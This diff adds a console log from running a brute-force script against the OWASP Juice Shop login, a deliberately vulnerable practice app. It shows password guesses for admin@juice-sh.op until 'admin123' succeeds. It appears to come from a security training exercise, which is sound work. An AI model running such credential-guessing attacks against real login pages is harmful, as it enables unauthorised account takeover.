@@ -1,0 +1,27 @@
+python3 brute-force.py 
+[*] Starting Brute Force Attack on OWASP Juice Shop Login
+
+Trying: admin@juice-sh.op - admin
+Failed: admin@juice-sh.op - admin
+Trying: admin@juice-sh.op - password
+Failed: admin@juice-sh.op - password
+Trying: admin@juice-sh.op - 123456
+Failed: admin@juice-sh.op - 123456
+Trying: admin@juice-sh.op - guest123
+Failed: admin@juice-sh.op - guest123
+Trying: admin@juice-sh.op - asdfsdf
+Failed: admin@juice-sh.op - asdfsdf
+Trying: admin@juice-sh.op - sldfd
+Failed: admin@juice-sh.op - sldfd
+Trying: admin@juice-sh.op - lskdjflkdj
+Failed: admin@juice-sh.op - lskdjflkdj
+Trying: admin@juice-sh.op - alsdkfjd
+Failed: admin@juice-sh.op - alsdkfjd
+Trying: admin@juice-sh.op - sldkjfds
+Failed: admin@juice-sh.op - sldkjfds
+Trying: admin@juice-sh.op - salfdjkf
+Failed: admin@juice-sh.op - salfdjkf
+Trying: admin@juice-sh.op - sdlafhlasd
+Failed: admin@juice-sh.op - sdlafhlasd
+Trying: admin@juice-sh.op - admin123
+Success: admin@juice-sh.op - admin123
